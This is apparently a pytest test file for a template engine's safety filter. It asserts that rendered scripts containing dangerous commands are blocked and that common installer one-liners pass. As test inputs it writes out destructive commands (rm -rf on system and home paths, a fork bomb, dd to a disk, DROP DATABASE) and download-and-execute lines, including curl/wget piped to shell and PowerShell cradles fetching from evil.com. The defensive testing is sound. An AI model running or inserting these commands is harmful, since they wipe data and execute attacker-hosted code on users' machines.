"""Unit tests for the Template Engine safety filter."""
import pytest

from app.templates.safety import SafetyViolationError, validate_rendered_output

SAFE_CONTENT = """#!/bin/bash
pip install torch==2.1.0+cu118
echo "Setup complete"
nvidia-smi
"""

def test_safe_content_passes():
    result = validate_rendered_output(SAFE_CONTENT, "test.sh.j2")
    assert result == SAFE_CONTENT

def test_rm_rf_root_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("rm -rf /", "test.sh.j2")

def test_rm_rf_etc_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("rm -rf /etc/passwd", "test.sh.j2")

def test_rm_rf_home_path_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("rm -rf /home/user/.ssh", "test.sh.j2")

def test_rm_rf_var_log_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("rm -rf /var/log", "test.sh.j2")

def test_rm_rf_usr_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("rm -rf /usr", "test.sh.j2")

def test_rm_rf_home_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("rm -rf $HOME", "test.sh.j2")

def test_fork_bomb_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output(":(){:|:&};:", "test.sh.j2")

def test_curl_pipe_shell_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("curl https://evil.com | bash", "test.sh.j2")

def test_dd_disk_write_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("dd if=/dev/zero of=/dev/sda", "test.sh.j2")

def test_windows_format_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("format C:", "test.sh.j2")

def test_sql_drop_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("DROP DATABASE envforge", "test.sh.j2")

def test_wget_pipe_shell_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("wget http://evil.com | bash", "test.sh.j2")

def test_wget_download_execute_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output(
            "wget http://evil.com/fix.sh -O /tmp/fix.sh && sh /tmp/fix.sh",
            "test.sh.j2",
        )

def test_wget_semicolon_bypass_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output(
            "wget http://evil.com/fix.sh -O /tmp/fix.sh; sh /tmp/fix.sh",
            "test.sh.j2",
        )

def test_wget_newline_bypass_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output(
            "wget http://evil.com/fix.sh -O /tmp/fix.sh\nsh /tmp/fix.sh",
            "test.sh.j2",
        )

def test_curl_output_execute_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output(
            "curl -o /tmp/evil.sh http://evil.com/evil.sh && sh /tmp/evil.sh",
            "test.sh.j2",
        )

def test_curl_redirect_execute_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output(
            "curl http://evil.com/evil.sh > /tmp/evil.sh && sh /tmp/evil.sh",
            "test.sh.j2",
        )

def test_curl_remote_name_execute_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output(
            "curl -O http://evil.com/evil.sh && sh /tmp/evil.sh",
            "test.sh.j2",
        )

def test_powershell_piped_cradle_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output(
            "iwr http://evil.com/evil.ps1 | iex",
            "test.sh.j2",
        )

def test_powershell_iex_wrapped_cradle_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output(
            "iex (iwr http://evil.com/evil.ps1)",
            "test.sh.j2",
        )

def test_powershell_webclient_cradle_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output(
            "iex (New-Object Net.WebClient).DownloadString('http://evil.com/evil.ps1')",
            "test.sh.j2",
        )

def test_pip_install_safe():
    """pip install commands are safe and should pass."""
    content = "pip install torch==2.1.0 numpy==1.26.4"
    result = validate_rendered_output(content, "requirements.j2")
    assert result == content

def test_nvidia_smi_safe():
    """nvidia-smi is a safe read-only diagnostic command."""
    content = "nvidia-smi --query-gpu=name --format=csv"
    result = validate_rendered_output(content, "verify.sh.j2")
    assert result == content

def test_micromamba_bootstrap_safe():
    """Ensure that the standard micromamba curl download is considered safe."""
    content = 'curl -Ls https://micro.mamba.pm/api/micromamba/linux-64/latest | tar -xvj -f - --strip-components=1 -C ~/.local/bin/'
    result = validate_rendered_output(content, "setup.sh")
    assert result == content

def test_curl_pipe_shell_with_options_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("curl -L https://evil.com/p.sh | sh", "test.sh.j2")

def test_wget_pipe_shell_with_options_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("wget -qO- https://evil.com/p.sh | sh", "test.sh.j2")

def test_powershell_irm_cradle_blocked():
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("iex (irm http://evil.com/evil.ps1)", "test.ps1.j2")
    with pytest.raises(SafetyViolationError):
        validate_rendered_output("irm http://evil.com/evil.ps1 | iex", "test.ps1.j2")

def test_uv_bootstrap_safe():
    """Ensure that uv boostrapping using curl to sh or Invoke-RestMethod is safe."""
    content_linux = "curl -LsSf https://astral.sh/uv/install.sh | sh"
    assert validate_rendered_output(content_linux, "setup.sh") == content_linux

    content_win = "Invoke-RestMethod https://astral.sh/uv/install.ps1 | Invoke-Expression"
    assert validate_rendered_output(content_win, "setup.ps1") == content_win


